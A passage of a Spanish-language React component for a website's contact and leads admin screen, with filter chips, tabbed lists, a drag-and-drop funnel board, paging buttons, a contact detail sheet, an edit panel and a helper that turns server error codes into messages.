              <button key={t} type="button" className={l.chip} aria-pressed={tipo === t} onClick={() => setTipo(t)}>
                {t === 'Todos' ? 'Todos' : ETIQUETA_TIPO[t]}
              </button>
            ))}
          </div>
          {procedencias.length > 0 && (
            <div className={l.chipsFila} role="group" aria-label="Por dónde entraron">
              <span className={l.chipsTitulo}>Por dónde entraron</span>
              {procedencias.map(([o, n]) => (
                <button key={o} type="button" className={l.chip} aria-pressed={deDonde === o} onClick={() => setDeDonde(deDonde === o ? null : o)}>
                  {o} <span className={l.chipNumero}>{n}</span>
                </button>
              ))}
            </div>
          )}
          {fuentes.length > 0 && (
            <div className={l.chipsFila} role="group" aria-label="Desde dónde llegaron a la web">
              <span className={l.chipsTitulo}>Desde dónde llegaron</span>
              {fuentes.map(([f, n]) => (
                <button key={f} type="button" className={l.chip} aria-pressed={deFuente === f} onClick={() => setDeFuente(deFuente === f ? null : f)}>
                  {f} <span className={l.chipNumero}>{n}</span>
                </button>
              ))}
            </div>
          )}
        </div>
      )}

      {lista.length === 0 && !fallo ? (
        <section className={css.tarjeta}>
          <p className={css.vacioTexto}>
            Todavía no hay nadie. En cuanto alguien deje su contacto en la web aparecerá aquí, y
            mientras tanto puedes apuntar tú a quien conozcas con «Añadir».
          </p>
        </section>
      ) : vista === 'lista' ? (
        <>
          {/* Las pestañas: qué toca con cada persona, con cuántas hay. Se
              puede deslizar en el móvil; ninguna se parte en dos líneas. */}
          <div className={l.pestanas} role="tablist" aria-label="Qué toca con cada persona">
            {PESTANAS.map((p) => {
              const n = cuentaPestana(p);
              if (p.soloSiHay && n === 0 && pestanaActiva.id !== p.id) return null;
              const activa = pestanaActiva.id === p.id;
              return (
                <button
                  key={p.id}
                  type="button"
                  role="tab"
                  aria-selected={activa}
                  className={l.pestana}
                  data-id={p.id}
                  data-hay={n > 0 ? '' : undefined}
                  onClick={() => setPestanaLista(p.id)}
                >
                  {p.titulo}
                  <span className={l.pestanaNumero}>{n}</span>
                </button>
              );
            })}
          </div>

          {enPestana.length === 0 ? (
            <p className={l.vacio}>
              {busca || filtrosPuestos
                ? 'Nadie con ese filtro.'
                : pestanaActiva.id === 'te-necesita'
                  ? 'Nadie espera respuesta tuya. Bien hecho.'
                  : 'Aquí no hay nadie ahora.'}
            </p>
          ) : (
            <>
              <ul className={l.lista} aria-label={pestanaActiva.titulo}>
                {enPestana.slice(0, cuantas).map((c) => fila(c))}
              </ul>
              {hayMas && (
                <div ref={setCentinela} className={l.mas50}>
                  <button type="button" className={css.btnLinea} onClick={() => setCuantas((n) => n + TANDA)}>
                    Ver más ({enPestana.length - cuantas} más)
                  </button>
                </div>
              )}
            </>
          )}
        </>
      ) : (
        <>
          {/* El embudo: de un vistazo, cuántas hay en cada paso. Tocar un paso en
              el móvil enseña esa columna. */}
          <div className={k.embudo} role="tablist" aria-label="En qué punto están">
            {COLUMNAS.map((col, i) => {
              const n = cuentaDe(col);
              return (
                <button
                  key={col.id}
                  type="button"
                  role="tab"
                  aria-selected={columnaMovil.id === col.id}
                  className={k.paso}
                  data-columna={col.id}
                  data-activo={columnaMovil.id === col.id ? '' : undefined}
                  onClick={() => setPestana(col.id)}
                >
                  <span className={k.pasoNumero}>
                    <motion.span key={n} initial={{ y: 8, opacity: 0 }} animate={{ y: 0, opacity: 1 }}>
                      {n}
                    </motion.span>
                  </span>
                  <span className={k.pasoTexto}>
                    <span className={k.pasoTitulo}>{col.titulo}</span>
                    <span className={k.pasoPista}>{col.pista}</span>
                  </span>
                  <span className={k.pasoBarra} aria-hidden="true">
                    <motion.span
                      className={k.pasoRelleno}
                      animate={{ width: activos ? `${(n / activos) * 100}%` : '0%' }}
                      transition={{ type: 'spring', stiffness: 200, damping: 30 }}
                    />
                  </span>
                  {i < COLUMNAS.length - 1 && (
                    <span className={k.flecha} aria-hidden="true">
                      <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" strokeWidth="1.8"><path d="M9 5l7 7-7 7" strokeLinecap="round" strokeLinejoin="round" /></svg>
                    </span>
                  )}
                </button>
              );
            })}
          </div>

          <LayoutGroup>
            <div className={k.tablero}>
              {COLUMNAS.map((col) => {
                const suyos = visibles.filter((c) => col.estados.includes(c.estado));
                /* Por tandas, como la lista: las primeras 50 y un botón para
                   las siguientes. Arrastrar sigue funcionando igual porque la
                   columna de destino no necesita tener pintadas las suyas. */
                const tantas = cuantasTablero[col.id] ?? TANDA;
                return (
                  <section
                    key={col.id}
                    className={k.columna}
                    data-columna={col.id}
                    data-movil-oculta={columnaMovil.id !== col.id ? '' : undefined}
                    data-encima={encima === col.id ? '' : undefined}
                    onDragOver={(e) => {
                      e.preventDefault();
                      if (encima !== col.id) setEncima(col.id);
                    }}
                    onDragLeave={(e) => {
                      if (!e.currentTarget.contains(e.relatedTarget as Node)) setEncima(null);
                    }}
                    onDrop={(e) => {
                      e.preventDefault();
                      setEncima(null);
                      setArrastrando(null);
                      const id = e.dataTransfer.getData('text/plain');
                      const c = lista.find((x) => x.id === id);
                      if (c && !col.estados.includes(c.estado)) mover(id, col.alSoltar);
                    }}
                    aria-label={col.titulo}
                  >
                    <div className={k.lista}>
                      <AnimatePresence mode="popLayout">
                        {suyos.slice(0, tantas).map((c) => tarjeta(c))}
                      </AnimatePresence>
                      {suyos.length > tantas && (
                        <button
                          type="button"
                          className={css.btnLinea}
                          onClick={() => setCuantasTablero((m) => ({ ...m, [col.id]: tantas + TANDA }))}
                        >
                          Ver más ({suyos.length - tantas} más)
                        </button>
                      )}
                      {suyos.length === 0 && (
                        <p className={k.vacio}>
                          {busca || filtrosPuestos
                            ? 'Nadie con ese filtro.'
                            : col.id === 'atender'
                              ? 'Todo atendido. Bien hecho.'
                              : 'Arrastra aquí una tarjeta.'}
                        </p>
                      )}
                    </div>
                  </section>
                );
              })}
            </div>
          </LayoutGroup>

          {(descartados.length > 0 || raros.length > 0) && (
            <div className={k.descartados}>
              <button type="button" className={css.enlaceAccion} onClick={() => setVerDescartados((v) => !v)}>
                {verDescartados ? 'Ocultar descartados' : `Ver descartados (${descartados.length + raros.length})`}
              </button>
              {verDescartados && (
                <div className={k.listaDescartados}>
                  {[...descartados, ...raros].slice(0, cuantasTablero.descartados ?? TANDA).map((c) => tarjeta(c))}
                  {descartados.length + raros.length > (cuantasTablero.descartados ?? TANDA) && (
                    <button
                      type="button"
                      className={css.btnLinea}
                      onClick={() =>
                        setCuantasTablero((m) => ({ ...m, descartados: (m.descartados ?? TANDA) + TANDA }))
                      }
                    >
                      Ver más descartados
                    </button>
                  )}
                </div>
              )}
            </div>
          )}
        </>
      )}

      {/* La ficha se busca en la lista por su id en cada repintado: así, al
          cambiarle el estado o apuntarle algo, se ve al momento y no se queda
          con la copia de cuando se abrió. */}
      <FichaPersona
        persona={(lista ?? []).find((c) => c.id === abierta) ?? null}
        onCerrar={() => setAbierta(null)}
        onCambiarEstado={(id, estado) => cambiarEstado(id, estado as Estado)}
        onApuntar={apuntar}
      />

      {/* La `key` hace que al pasar de apuntar a corregir —o de una persona a
          otra— el panel se monte de nuevo con su borrador recién puesto, en vez
          de quedarse con lo que hubiera escrito antes. */}
      {modo && (
        <PanelContacto
          key={modo.que === 'editar' ? `editar-${modo.contacto.id}` : 'nuevo'}
          modo={modo}
          onCerrar={() => setModo(null)}
          onGuardar={guardar}
          /**
           * Abrir la ficha de quien ya estaba apuntada.
           *
           * Devuelve si se ha podido. La ficha se busca dentro de la lista
           * cargada, y esa lista viene recortada por el tope del servidor: si
           * la persona está en la base de datos pero no en el trozo que ha
           * llegado, cerrar el panel dejaba la pantalla sin panel y sin ficha,
           * como si el botón no hiciera nada. Ahora, si no está, el panel se
           * queda abierto y lo dice.
           */
          onVerFicha={(id) => {
            if (!lista?.some((c) => c.id === id)) return false;
            setModo(null);
            setAbierta(id);
            return true;
          }}
        />
      )}
    </div>
  );
}

/** Lo que contesta el servidor cuando el fallo no es de ningún campo. */
function motivoEnPalabras(motivo: unknown): string {
  if (motivo === 'sin-configurar') return 'Falta la configuración de Firebase en el servidor.';
  if (motivo === 'sin-permiso') return 'Esto solo lo puede hacer Sorela.';
  if (motivo === 'sin-sesion') return 'Se ha cerrado la sesión. Vuelve a entrar.';
  if (motivo === 'sin-cambios') return 'No has cambiado nada.';
  if (motivo === 'no-existe') return 'Esa ficha ya no está: la han borrado mientras la corregías.';
  return 'No he podido guardarlo. Vuelve a intentarlo.';
}
